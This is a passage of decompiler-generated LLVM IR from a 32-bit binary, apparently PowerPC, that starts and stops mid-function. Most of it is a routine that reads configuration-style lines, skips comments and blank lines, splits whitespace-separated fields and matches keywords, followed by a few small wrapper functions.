  br i1 %v3_1000b4d0, label %dec_label_pc_1000b4d8, label %dec_label_pc_1000b6ec.preheader

dec_label_pc_1000b4d8:                            ; preds = %dec_label_pc_1000b4b8
  %v0_1000b4dc = load i32, i32* @r31, align 4
  store i32 ptrtoint ([24 x i8]* @global_var_1000f8c0.324 to i32), i32* %r3.global-to-local, align 4
  store i32 268481768, i32* @lr, align 4
  %v3_1000b4e4 = call i32 @function_10004f90(i32 ptrtoint ([24 x i8]* @global_var_1000f8c0.324 to i32), i32 %v0_1000b4dc)
  store i32 %v3_1000b4e4, i32* %r3.global-to-local, align 4
  store i32 %v3_1000b4e4, i32* @r26, align 4
  %v3_1000b4e8 = icmp eq i32 %v3_1000b4e4, 0
  br i1 %v3_1000b4e8, label %dec_label_pc_1000b71c, label %dec_label_pc_1000b6ec.preheader

dec_label_pc_1000b6ec.preheader:                  ; preds = %dec_label_pc_1000b4b8, %dec_label_pc_1000b4d8
  %v0_1000b6f816 = phi i32 [ %v3_1000b4cc, %dec_label_pc_1000b4b8 ], [ %v3_1000b4e4, %dec_label_pc_1000b4d8 ]
  %v2_1000b6ec = ptrtoint i32* %stack_var_-164 to i32
  %v1_1000b4f82 = bitcast i32* %stack_var_-164 to i8*
  %v3_1000b5dc = inttoptr i32 %tmp to i8*
  br label %dec_label_pc_1000b6ec

dec_label_pc_1000b4f4:                            ; preds = %dec_label_pc_1000b50c
  %v1_1000b4f4 = add i32 %v0_1000b5b49, 1
  store i32 %v1_1000b4f4, i32* %r3.global-to-local, align 4
  %v1_1000b4f8 = inttoptr i32 %v1_1000b4f4 to i8*
  %v2_1000b4f8 = load i8, i8* %v1_1000b4f8, align 1
  %v3_1000b4f8 = zext i8 %v2_1000b4f8 to i32
  store i32 %v3_1000b4f8, i32* %r11.global-to-local, align 4
  %v3_1000b500 = icmp eq i8 %v2_1000b4f8, 0
  br i1 %v3_1000b500, label %dec_label_pc_1000b6ec.backedge, label %dec_label_pc_1000b50c

dec_label_pc_1000b50c:                            ; preds = %dec_label_pc_1000b50c.lr.ph, %dec_label_pc_1000b4f4
  %v0_1000b510.in = phi i32 [ %v3_1000b4f84, %dec_label_pc_1000b50c.lr.ph ], [ %v3_1000b4f8, %dec_label_pc_1000b4f4 ]
  %v0_1000b524 = phi i32 [ %v3_1000b4f84, %dec_label_pc_1000b50c.lr.ph ], [ %v3_1000b4f8, %dec_label_pc_1000b4f4 ]
  %v0_1000b5b49 = phi i32 [ %v2_1000b6ec, %dec_label_pc_1000b50c.lr.ph ], [ %v1_1000b4f4, %dec_label_pc_1000b4f4 ]
  %v0_1000b510 = mul nuw nsw i32 %v0_1000b510.in, 2
  %v2_1000b510 = add i32 %v0_1000b510, %v3_1000b50c.pre
  %v3_1000b510 = inttoptr i32 %v2_1000b510 to i16*
  %v4_1000b510 = load i16, i16* %v3_1000b510, align 2
  %v1_1000b514 = and i16 %v4_1000b510, 32
  %v3_1000b514 = icmp eq i16 %v1_1000b514, 0
  br i1 %v3_1000b514, label %dec_label_pc_1000b51c, label %dec_label_pc_1000b4f4

dec_label_pc_1000b51c:                            ; preds = %dec_label_pc_1000b50c
  %v3_1000b51c = icmp eq i32 %v0_1000b524, 10
  br i1 %v3_1000b51c, label %dec_label_pc_1000b6ec.backedge, label %dec_label_pc_1000b524

dec_label_pc_1000b6ec.backedge:                   ; preds = %dec_label_pc_1000b4f4, %dec_label_pc_1000b6a0, %dec_label_pc_1000b6a8, %dec_label_pc_1000b6e0, %dec_label_pc_1000b4f8.preheader, %dec_label_pc_1000b51c, %dec_label_pc_1000b524, %dec_label_pc_1000b648
  %v0_1000b6f8.pre = load i32, i32* @r26, align 4
  br label %dec_label_pc_1000b6ec

dec_label_pc_1000b524:                            ; preds = %dec_label_pc_1000b51c
  %v3_1000b524 = icmp eq i32 %v0_1000b524, 35
  br i1 %v3_1000b524, label %dec_label_pc_1000b6ec.backedge, label %dec_label_pc_1000b52c

dec_label_pc_1000b52c:                            ; preds = %dec_label_pc_1000b524
  store i32 0, i32* @r27, align 4
  store i32 %v2_1000b490, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v1_1000b5b410 = inttoptr i32 %v0_1000b5b49 to i8*
  %v2_1000b5b411 = load i8, i8* %v1_1000b5b410, align 1
  %v3_1000b5b814 = icmp eq i8 %v2_1000b5b411, 0
  br i1 %v3_1000b5b814, label %dec_label_pc_1000b5c8, label %dec_label_pc_1000b5c0

dec_label_pc_1000b540:                            ; preds = %dec_label_pc_1000b5c0
  %v3_1000b540 = load i32, i32* @global_var_1001044c, align 4
  store i32 %v3_1000b540, i32* %r11.global-to-local, align 4
  %v1_1000b544 = mul i32 %v0_1000b544, 4
  %v1_1000b548 = load i32, i32* %r6.global-to-local, align 4
  %v2_1000b548 = add i32 %v1_1000b548, %v1_1000b544
  %v2_1000b54c = add i32 %v2_1000b548, 16
  %v3_1000b54c = inttoptr i32 %v2_1000b54c to i32*
  store i32 %v0_1000b54c, i32* %v3_1000b54c, align 4
  %v0_1000b558.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000b558

dec_label_pc_1000b554:                            ; preds = %dec_label_pc_1000b56c
  %v1_1000b554 = add i32 %v0_1000b554, 1
  store i32 %v1_1000b554, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000b558

dec_label_pc_1000b558:                            ; preds = %dec_label_pc_1000b540, %dec_label_pc_1000b554
  %v0_1000b554 = phi i32 [ %v0_1000b558.pre, %dec_label_pc_1000b540 ], [ %v1_1000b554, %dec_label_pc_1000b554 ]
  %v1_1000b558 = inttoptr i32 %v0_1000b554 to i8*
  %v2_1000b558 = load i8, i8* %v1_1000b558, align 1
  %v3_1000b55c = icmp eq i8 %v2_1000b558, 0
  br i1 %v3_1000b55c, label %dec_label_pc_1000b588, label %dec_label_pc_1000b56c

dec_label_pc_1000b56c:                            ; preds = %dec_label_pc_1000b558
  %v3_1000b564 = icmp eq i8 %v2_1000b558, 10
  %v3_1000b558 = zext i8 %v2_1000b558 to i32
  %v1_1000b560 = mul nuw nsw i32 %v3_1000b558, 2
  %v1_1000b56c = load i32, i32* %r11.global-to-local, align 4
  %v2_1000b56c = add i32 %v1_1000b56c, %v1_1000b560
  %v3_1000b56c = inttoptr i32 %v2_1000b56c to i16*
  %v4_1000b56c = load i16, i16* %v3_1000b56c, align 2
  %v1_1000b570 = and i16 %v4_1000b56c, 32
  %v3_1000b570.not = icmp ne i16 %v1_1000b570, 0
  %brmerge = or i1 %v3_1000b564, %v3_1000b570.not
  br i1 %brmerge, label %dec_label_pc_1000b588, label %dec_label_pc_1000b554

dec_label_pc_1000b580:                            ; preds = %dec_label_pc_1000b59c
  %v0_1000b580 = load i32, i32* %r7.global-to-local, align 4
  %v1_1000b580 = trunc i32 %v0_1000b580 to i8
  store i8 %v1_1000b580, i8* %v1_1000b588, align 1
  %v0_1000b584 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000b584 = add i32 %v0_1000b584, 1
  store i32 %v1_1000b584, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000b588

dec_label_pc_1000b588:                            ; preds = %dec_label_pc_1000b56c, %dec_label_pc_1000b558, %dec_label_pc_1000b580
  %v0_1000b5b4 = phi i32 [ %v1_1000b584, %dec_label_pc_1000b580 ], [ %v0_1000b554, %dec_label_pc_1000b558 ], [ %v0_1000b554, %dec_label_pc_1000b56c ]
  %v1_1000b588 = inttoptr i32 %v0_1000b5b4 to i8*
  %v2_1000b588 = load i8, i8* %v1_1000b588, align 1
  %v3_1000b588 = zext i8 %v2_1000b588 to i32
  %v3_1000b58c = icmp eq i8 %v2_1000b588, 0
  %v1_1000b590 = mul nuw nsw i32 %v3_1000b588, 2
  store i32 %v1_1000b590, i32* %r11.global-to-local, align 4
  br i1 %v3_1000b58c, label %dec_label_pc_1000b5b0, label %dec_label_pc_1000b59c

dec_label_pc_1000b59c:                            ; preds = %dec_label_pc_1000b588
  %v3_1000b594 = icmp eq i8 %v2_1000b588, 10
  %v3_1000b59c = load i32, i32* @global_var_1001044c, align 4
  %v2_1000b5a0 = add i32 %v3_1000b59c, %v1_1000b590
  %v3_1000b5a0 = inttoptr i32 %v2_1000b5a0 to i16*
  %v4_1000b5a0 = load i16, i16* %v3_1000b5a0, align 2
  %v1_1000b5a4 = and i16 %v4_1000b5a0, 32
  %v3_1000b5a4.not = icmp ne i16 %v1_1000b5a4, 0
  %brmerge27 = or i1 %v3_1000b594, %v3_1000b5a4.not
  br i1 %brmerge27, label %dec_label_pc_1000b580, label %dec_label_pc_1000b5b0

dec_label_pc_1000b5b0:                            ; preds = %dec_label_pc_1000b59c, %dec_label_pc_1000b588
  %v0_1000b5b0 = load i32, i32* @r27, align 4
  %v1_1000b5b0 = add i32 %v0_1000b5b0, 1
  store i32 %v1_1000b5b0, i32* @r27, align 4
  %v2_1000b5b4 = load i8, i8* %v1_1000b588, align 1
  %v3_1000b5b8 = icmp eq i8 %v2_1000b5b4, 0
  br i1 %v3_1000b5b8, label %dec_label_pc_1000b5c8, label %dec_label_pc_1000b5c0

dec_label_pc_1000b5c0:                            ; preds = %dec_label_pc_1000b52c, %dec_label_pc_1000b5b0
  %v0_1000b54c = phi i32 [ %v0_1000b5b4, %dec_label_pc_1000b5b0 ], [ %v0_1000b5b49, %dec_label_pc_1000b52c ]
  %v0_1000b544 = phi i32 [ %v1_1000b5b0, %dec_label_pc_1000b5b0 ], [ 0, %dec_label_pc_1000b52c ]
  %tmp33 = icmp slt i32 %v0_1000b544, 5
  br i1 %tmp33, label %dec_label_pc_1000b540, label %dec_label_pc_1000b5c8

dec_label_pc_1000b5c8:                            ; preds = %dec_label_pc_1000b5b0, %dec_label_pc_1000b5c0, %dec_label_pc_1000b52c
  store i32 %tmp, i32* @r30, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_1000f8d8.325 to i32), i32* @r4, align 4
  store i32 1, i32* @r31, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v4_1000b5dc = call i32 @function_10007230(i8* %v3_1000b5dc, i32 ptrtoint ([11 x i8]* @global_var_1000f8d8.325 to i32))
  store i32 %v4_1000b5dc, i32* %r3.global-to-local, align 4
  %v3_1000b5e0 = icmp eq i32 %v4_1000b5dc, 0
  br i1 %v3_1000b5e0, label %dec_label_pc_1000b60c, label %dec_label_pc_1000b630

dec_label_pc_1000b5ec:                            ; preds = %dec_label_pc_1000b624
  %v1_1000b5ec = add i32 %v2_1000b614, 24
  %v2_1000b5ec = inttoptr i32 %v1_1000b5ec to i32*
  %v3_1000b5ec = load i32, i32* %v2_1000b5ec, align 4
  store i32 %v3_1000b5ec, i32* %r3.global-to-local, align 4
  store i32 268482036, i32* @lr, align 4
  %v1_1000b5f0 = call i32 @function_1000775c(i32 %v3_1000b5ec)
  store i32 %v1_1000b5f0, i32* %r3.global-to-local, align 4
  %v0_1000b5f8 = load i32, i32* @r29, align 4
  %v1_1000b5f8 = add i32 %v0_1000b5f8, 1
  store i32 %v1_1000b5f8, i32* %r11.global-to-local, align 4
  %v1_1000b5fc = mul i32 %v0_1000b5f8, 4
  store i32 %v1_1000b5f8, i32* @global_var_100104c8.263, align 4
  %v3_1000b608 = add i32 %v1_1000b5fc, ptrtoint (i32* @global_var_10012d4c.264 to i32)
  %v4_1000b608 = inttoptr i32 %v3_1000b608 to i32*
  store i32 %v1_1000b5f0, i32* %v4_1000b608, align 4
  br label %dec_label_pc_1000b60c

dec_label_pc_1000b60c:                            ; preds = %dec_label_pc_1000b5c8, %dec_label_pc_1000b5ec
  %v0_1000b60c = load i32, i32* @r31, align 4
  %v1_1000b60c = load i32, i32* @r27, align 4
  %v2_1000b60c = icmp slt i32 %v0_1000b60c, %v1_1000b60c
  %v1_1000b610 = mul i32 %v0_1000b60c, 4
  %v0_1000b614 = load i32, i32* @r1, align 4
  %v2_1000b614 = add i32 %v0_1000b614, %v1_1000b610
  br i1 %v2_1000b60c, label %dec_label_pc_1000b624, label %dec_label_pc_1000b630

dec_label_pc_1000b624:                            ; preds = %dec_label_pc_1000b60c
  %v3_1000b624 = load i32, i32* @global_var_100104c8.263, align 4
  %tmp35 = icmp slt i32 %v3_1000b624, 3
  br i1 %tmp35, label %dec_label_pc_1000b5ec, label %dec_label_pc_1000b630

dec_label_pc_1000b630:                            ; preds = %dec_label_pc_1000b624, %dec_label_pc_1000b60c, %dec_label_pc_1000b5c8
  %v0_1000b634 = load i32, i32* @r30, align 4
  store i32 %v0_1000b634, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1000f8e4.326 to i32), i32* @r4, align 4
  %v3_1000b63c = inttoptr i32 %v0_1000b634 to i8*
  %v4_1000b63c = call i32 @function_10007230(i8* %v3_1000b63c, i32 ptrtoint ([7 x i8]* @global_var_1000f8e4.326 to i32))
  store i32 %v4_1000b63c, i32* %r3.global-to-local, align 4
  %v3_1000b640 = icmp eq i32 %v4_1000b63c, 0
  br i1 %v3_1000b640, label %dec_label_pc_1000b680.preheader, label %dec_label_pc_1000b648

dec_label_pc_1000b648:                            ; preds = %dec_label_pc_1000b630
  %v0_1000b64c = load i32, i32* @r30, align 4
  store i32 %v0_1000b64c, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1000f8ec.327 to i32), i32* @r4, align 4
  %v3_1000b654 = inttoptr i32 %v0_1000b64c to i8*
  %v4_1000b654 = call i32 @function_10007230(i8* %v3_1000b654, i32 ptrtoint ([7 x i8]* @global_var_1000f8ec.327 to i32))
  store i32 %v4_1000b654, i32* %r3.global-to-local, align 4
  %v3_1000b658 = icmp eq i32 %v4_1000b654, 0
  br i1 %v3_1000b658, label %dec_label_pc_1000b680.preheader, label %dec_label_pc_1000b6ec.backedge

dec_label_pc_1000b680.preheader:                  ; preds = %dec_label_pc_1000b630, %dec_label_pc_1000b648
  store i32 ptrtoint (i32* @global_var_10012d3c.314 to i32), i32* @r31, align 4
  %v3_1000b68c41 = load i32, i32* @global_var_100104cc.312, align 4
  %v2_1000b69043 = icmp sgt i32 %v3_1000b68c41, 0
  %v1_1000b69445 = add i32 %v3_1000b68c41, -1
  %v1_1000b69846 = mul i32 %v1_1000b69445, 4
  store i32 %v1_1000b69846, i32* %r11.global-to-local, align 4
  br i1 %v2_1000b69043, label %dec_label_pc_1000b664, label %dec_label_pc_1000b6a0

dec_label_pc_1000b664:                            ; preds = %dec_label_pc_1000b680.preheader, %dec_label_pc_1000b664
  %v1_1000b69848 = phi i32 [ %v1_1000b698, %dec_label_pc_1000b664 ], [ %v1_1000b69846, %dec_label_pc_1000b680.preheader ]
  %v1_1000b69447 = phi i32 [ %v1_1000b694, %dec_label_pc_1000b664 ], [ %v1_1000b69445, %dec_label_pc_1000b680.preheader ]
  %v2_1000b664 = add i32 %v1_1000b69848, ptrtoint (i32* @global_var_10012d3c.314 to i32)
  %v3_1000b664 = inttoptr i32 %v2_1000b664 to i32*
  %v4_1000b664 = load i32, i32* %v3_1000b664, align 4
  store i32 %v4_1000b664, i32* @r3, align 4
  store i32 %v1_1000b69447, i32* @global_var_100104cc.312, align 4
  store i32 268482160, i32* @lr, align 4
  %v0_1000b66c = call i32 @function_100081f4()
  store i32 %v0_1000b66c, i32* %r3.global-to-local, align 4
  %v3_1000b670 = load i32, i32* @global_var_100104cc.312, align 4
  %v1_1000b678 = mul i32 %v3_1000b670, 4
  %v1_1000b67c = load i32, i32* @r31, align 4
  %v3_1000b67c = add i32 %v1_1000b67c, %v1_1000b678
  %v4_1000b67c = inttoptr i32 %v3_1000b67c to i32*
  store i32 0, i32* %v4_1000b67c, align 4
  store i32 ptrtoint (i32* @global_var_10012d3c.314 to i32), i32* @r31, align 4
  %v3_1000b68c = load i32, i32* @global_var_100104cc.312, align 4
  %v2_1000b690 = icmp sgt i32 %v3_1000b68c, 0
  %v1_1000b694 = add i32 %v3_1000b68c, -1
  %v1_1000b698 = mul i32 %v1_1000b694, 4
  store i32 %v1_1000b698, i32* %r11.global-to-local, align 4
  br i1 %v2_1000b690, label %dec_label_pc_1000b664, label %dec_label_pc_1000b6a0

dec_label_pc_1000b6a0:                            ; preds = %dec_label_pc_1000b664, %dec_label_pc_1000b680.preheader
  %v3_1000b6e059 = phi i32 [ %v3_1000b68c41, %dec_label_pc_1000b680.preheader ], [ %v3_1000b68c, %dec_label_pc_1000b664 ]
  %v1_1000b6c849 = load i32, i32* @r27, align 4
  %v2_1000b6c850 = icmp sgt i32 %v1_1000b6c849, 1
  %v0_1000b6d053 = load i32, i32* @r1, align 4
  %v2_1000b6d054 = add i32 %v0_1000b6d053, 4
  br i1 %v2_1000b6c850, label %dec_label_pc_1000b6e0, label %dec_label_pc_1000b6ec.backedge

dec_label_pc_1000b6a8:                            ; preds = %dec_label_pc_1000b6e0
  %v1_1000b6a8 = add i32 %v2_1000b6d055, 24
  %v2_1000b6a8 = inttoptr i32 %v1_1000b6a8 to i32*
  %v3_1000b6a8 = load i32, i32* %v2_1000b6a8, align 4
  store i32 %v3_1000b6a8, i32* %r3.global-to-local, align 4
  store i32 268482224, i32* @lr, align 4
  %v1_1000b6ac = call i32 @function_1000775c(i32 %v3_1000b6a8)
  store i32 %v1_1000b6ac, i32* %r3.global-to-local, align 4
  %v0_1000b6b4 = load i32, i32* @r29, align 4
  %v1_1000b6b4 = add i32 %v0_1000b6b4, 1
  store i32 %v1_1000b6b4, i32* %r11.global-to-local, align 4
  %v1_1000b6b8 = mul i32 %v0_1000b6b4, 4
  store i32 %v1_1000b6b4, i32* @global_var_100104cc.312, align 4
  %v3_1000b6c4 = add i32 %v1_1000b6b8, ptrtoint (i32* @global_var_10012d3c.314 to i32)
  %v4_1000b6c4 = inttoptr i32 %v3_1000b6c4 to i32*
  store i32 %v1_1000b6ac, i32* %v4_1000b6c4, align 4
  %v0_1000b6c8.pre = load i32, i32* @r31, align 4
  %v1_1000b6c8 = load i32, i32* @r27, align 4
  %v2_1000b6c8 = icmp slt i32 %v0_1000b6c8.pre, %v1_1000b6c8
  br i1 %v2_1000b6c8, label %dec_label_pc_1000b6a8.dec_label_pc_1000b6e0_crit_edge, label %dec_label_pc_1000b6ec.backedge

dec_label_pc_1000b6a8.dec_label_pc_1000b6e0_crit_edge: ; preds = %dec_label_pc_1000b6a8
  %v0_1000b6d0 = load i32, i32* @r1, align 4
  %v1_1000b6cc = mul i32 %v0_1000b6c8.pre, 4
  %v2_1000b6d0 = add i32 %v0_1000b6d0, %v1_1000b6cc
  %v3_1000b6e0.pre = load i32, i32* @global_var_100104cc.312, align 4
  br label %dec_label_pc_1000b6e0

dec_label_pc_1000b6e0:                            ; preds = %dec_label_pc_1000b6a0, %dec_label_pc_1000b6a8.dec_label_pc_1000b6e0_crit_edge
  %v3_1000b6e0 = phi i32 [ %v3_1000b6e0.pre, %dec_label_pc_1000b6a8.dec_label_pc_1000b6e0_crit_edge ], [ %v3_1000b6e059, %dec_label_pc_1000b6a0 ]
  %v2_1000b6d055 = phi i32 [ %v2_1000b6d0, %dec_label_pc_1000b6a8.dec_label_pc_1000b6e0_crit_edge ], [ %v2_1000b6d054, %dec_label_pc_1000b6a0 ]
  %tmp37 = icmp slt i32 %v3_1000b6e0, 4
  br i1 %tmp37, label %dec_label_pc_1000b6a8, label %dec_label_pc_1000b6ec.backedge

dec_label_pc_1000b6ec:                            ; preds = %dec_label_pc_1000b6ec.backedge, %dec_label_pc_1000b6ec.preheader
  %v0_1000b6f8 = phi i32 [ %v0_1000b6f8.pre, %dec_label_pc_1000b6ec.backedge ], [ %v0_1000b6f816, %dec_label_pc_1000b6ec.preheader ]
  store i32 %v2_1000b6ec, i32* %r3.global-to-local, align 4
  store i32 268482304, i32* @lr, align 4
  %v3_1000b6fc = call i32 @function_1000694c(i32 %v2_1000b6ec, i32 128, i32 %v0_1000b6f8)
  store i32 %v3_1000b6fc, i32* %r3.global-to-local, align 4
  %v3_1000b700 = icmp eq i32 %v3_1000b6fc, 0
  br i1 %v3_1000b700, label %dec_label_pc_1000b710, label %dec_label_pc_1000b4f8.preheader

dec_label_pc_1000b4f8.preheader:                  ; preds = %dec_label_pc_1000b6ec
  store i32 %v2_1000b6ec, i32* %r3.global-to-local, align 4
  %v2_1000b4f83 = load i8, i8* %v1_1000b4f82, align 4
  %v3_1000b4f84 = zext i8 %v2_1000b4f83 to i32
  store i32 %v3_1000b4f84, i32* %r11.global-to-local, align 4
  %v3_1000b5006 = icmp eq i8 %v2_1000b4f83, 0
  br i1 %v3_1000b5006, label %dec_label_pc_1000b6ec.backedge, label %dec_label_pc_1000b50c.lr.ph

dec_label_pc_1000b50c.lr.ph:                      ; preds = %dec_label_pc_1000b4f8.preheader
  %v3_1000b50c.pre = load i32, i32* @global_var_1001044c, align 4
  br label %dec_label_pc_1000b50c

dec_label_pc_1000b710:                            ; preds = %dec_label_pc_1000b6ec
  %v0_1000b710 = load i32, i32* @r26, align 4
  store i32 %v0_1000b710, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000b718.328 to i32), i32* @lr, align 4
  %v1_1000b714 = inttoptr i32 %v0_1000b710 to i16*
  %v2_1000b714 = call i32 @function_10004e44(i16* %v1_1000b714)
  store i32 %v2_1000b714, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000b728

dec_label_pc_1000b71c:                            ; preds = %dec_label_pc_1000b4d8
  %v0_1000b71c = call i32 @function_10009ac8()
  store i32 %v0_1000b71c, i32* %r3.global-to-local, align 4
  %v2_1000b724 = inttoptr i32 %v0_1000b71c to i32*
  store i32 3, i32* %v2_1000b724, align 4
  br label %dec_label_pc_1000b728

dec_label_pc_1000b728:                            ; preds = %dec_label_pc_1000b474, %dec_label_pc_1000b710, %dec_label_pc_1000b71c
  store i32 %v2_1000b490, i32* @r3, align 4
  %v0_1000b730 = call i32 @function_100091fc()
  store i32 %v0_1000b730, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000b730

; uselistorder directives
  uselistorder i32 %v3_1000b4f84, { 2, 0, 1 }
  uselistorder i32 %v1_1000b69846, { 1, 0 }
  uselistorder i32 %v1_1000b69445, { 1, 0 }
  uselistorder i32 %v0_1000b544, { 1, 0 }
  uselistorder i32 %v1_1000b590, { 1, 0 }
  uselistorder i8* %v1_1000b588, { 0, 2, 1 }
  uselistorder i8 %v2_1000b558, { 2, 0, 1 }
  uselistorder i32 %v0_1000b554, { 0, 1, 3, 2 }
  uselistorder i32 %v3_1000b4f8, { 1, 0, 2 }
  uselistorder i32 %v1_1000b4f4, { 0, 2, 1 }
  uselistorder i32 %v2_1000b6ec, { 1, 3, 2, 0 }
  uselistorder i32 %v2_1000b490, { 1, 0, 2 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 28, 18, 19, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 26, 17, 27, 0, 20, 21, 22, 23, 24, 25 }
  uselistorder i32* %r11.global-to-local, { 8, 1, 2, 0, 3, 4, 5, 6, 7 }
  uselistorder i32 ()* @function_10009ac8, { 5, 4, 3, 2, 0, 1 }
  uselistorder i32 ()* @function_100081f4, { 20, 19, 18, 17, 16, 15, 14, 13, 7, 6, 12, 11, 10, 9, 8, 3, 2, 22, 21, 1, 5, 4, 24, 23, 0 }
  uselistorder i32* @global_var_100104cc.312, { 0, 2, 3, 4, 5, 1, 6, 7, 8 }
  uselistorder i32 ptrtoint (i32* @global_var_10012d3c.314 to i32), { 3, 5, 1, 0, 2, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_10012d4c.264 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_100103e0.262 to i32), { 0, 2, 3, 4, 1, 5 }
  uselistorder label %dec_label_pc_1000b728, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000b6e0, { 1, 0 }
  uselistorder label %dec_label_pc_1000b664, { 1, 0 }
  uselistorder label %dec_label_pc_1000b680.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1000b60c, { 1, 0 }
  uselistorder label %dec_label_pc_1000b5c8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000b5c0, { 1, 0 }
  uselistorder label %dec_label_pc_1000b588, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000b558, { 1, 0 }
  uselistorder label %dec_label_pc_1000b6ec.backedge, { 4, 3, 2, 1, 7, 6, 5, 0 }
  uselistorder label %dec_label_pc_1000b6ec.preheader, { 1, 0 }
}

define i32 @function_1000b748(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_1000b748:
  %stack_var_0 = alloca i32, align 4
  %v4_1000b748 = ptrtoint i32* %stack_var_0 to i32
  store i32 %arg6, i32* @r10, align 4
  store i32 %arg5, i32* @r29, align 4
  store i32 268482444, i32* @lr, align 4
  %v9_1000b788 = inttoptr i32 %arg3 to i32*
  %v10_1000b788 = call i32 @function_1000cbe8(i32 0, i32 %arg1, i32 %arg2, i32 0, i32* %v9_1000b788, i32 %arg4, i32 %arg5, i32 %v4_1000b748, i32 %arg7)
  ret i32 %v10_1000b788
}

define i32 @function_1000b7a0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1000b7a0:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000b7b4 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268482504, i32* @lr, align 4
  %v2_1000b7c4 = call i32 @function_1000955c(i32 9, i32 %v2_1000b7b4)
  ret i32 %v2_1000b7c4

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_1000955c, { 6, 4, 8, 7, 3, 2, 5, 1, 0 }
}

define i32 @function_1000b7d8(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000b7d8:
  %r0.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-172 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_1000b7dc = load i32, i32* @lr, align 4
  store i32 %v0_1000b7dc, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_1000b7e8 = icmp eq i32* %arg2, null
  store i32 %arg3, i32* %r30.global-to-local, align 4
  %v1_1000b7f8 = add i32 %tmp, 4
  store i32 %v1_1000b7f8, i32* @r4, align 4
  store i32 128, i32* @r5, align 4
  %v2_1000b800 = ptrtoint i32* %stack_var_-300 to i32
  store i32 %v2_1000b800, i32* @r3, align 4
  br i1 %v3_1000b7e8, label %dec_label_pc_1000b828, label %dec_label_pc_1000b808

dec_label_pc_1000b808:                            ; preds = %dec_label_pc_1000b7d8
  %v2_1000b808 = load i32, i32* %arg2, align 4
  store i32 %v2_1000b808, i32* %r0.global-to-local, align 4
  store i32 268482580, i32* @lr, align 4
  %v0_1000b810 = call i32 @function_10007104()
  %v0_1000b814 = load i32, i32* @r31, align 4
  %v1_1000b814 = add i32 %v0_1000b814, 132
  %v2_1000b814 = inttoptr i32 %v1_1000b814 to i32*
  %v3_1000b814 = load i32, i32* %v2_1000b814, align 4
  store i32 %v3_1000b814, i32* %r0.global-to-local, align 4
  %v1_1000b820 = add i32 %v0_1000b814, 136
  %v2_1000b820 = inttoptr i32 %v1_1000b820 to i32*
  %v3_1000b820 = load i32, i32* %v2_1000b820, align 4
  store i32 %v3_1000b820, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000b828

dec_label_pc_1000b828:                            ; preds = %dec_label_pc_1000b7d8, %dec_label_pc_1000b808
  store i32 268482632, i32* @lr, align 4
  %v0_1000b844 = call i32 @function_1000bae8()
  %v0_1000b848 = load i32, i32* %r30.global-to-local, align 4
  %v3_1000b848 = icmp eq i32 %v0_1000b848, 0
  store i32 %v0_1000b844, i32* @r31, align 4
  br i1 %v3_1000b848, label %dec_label_pc_1000b884, label %dec_label_pc_1000b858

dec_label_pc_1000b858:                            ; preds = %dec_label_pc_1000b828
  %v1_1000b850 = icmp slt i32 %v0_1000b844, 0
  %v1_1000b858 = add i32 %v0_1000b848, 4
  store i32 %v1_1000b858, i32* @r3, align 4
  %v2_1000b85c = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_1000b85c, i32* @r4, align 4
  store i32 128, i32* @r5, align 4
  br i1 %v1_1000b850, label %dec_label_pc_1000b884, label %dec_label_pc_1000b868

dec_label_pc_1000b868:                            ; preds = %dec_label_pc_1000b858
  %v3_1000b868 = load i32, i32* %stack_var_-172, align 4
  store i32 %v3_1000b868, i32* %r0.global-to-local, align 4
  %v2_1000b86c = inttoptr i32 %v0_1000b848 to i32*
  store i32 %v3_1000b868, i32* %v2_1000b86c, align 4
  store i32 268482676, i32* @lr, align 4
  %v0_1000b870 = call i32 @function_10007104()
  %v1_1000b87c = load i32, i32* %r30.global-to-local, align 4
  %v2_1000b87c = add i32 %v1_1000b87c, 136
  %v3_1000b87c = inttoptr i32 %v2_1000b87c to i32*
  %v0_1000b880 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000b880 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000b880 = add i32 %v1_1000b880, 132
  %v3_1000b880 = inttoptr i32 %v2_1000b880 to i32*
  store i32 %v0_1000b880, i32* %v3_1000b880, align 4
  %v0_1000b888.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000b884

dec_label_pc_1000b884:                            ; preds = %dec_label_pc_1000b858, %dec_label_pc_1000b828, %dec_label_pc_1000b868
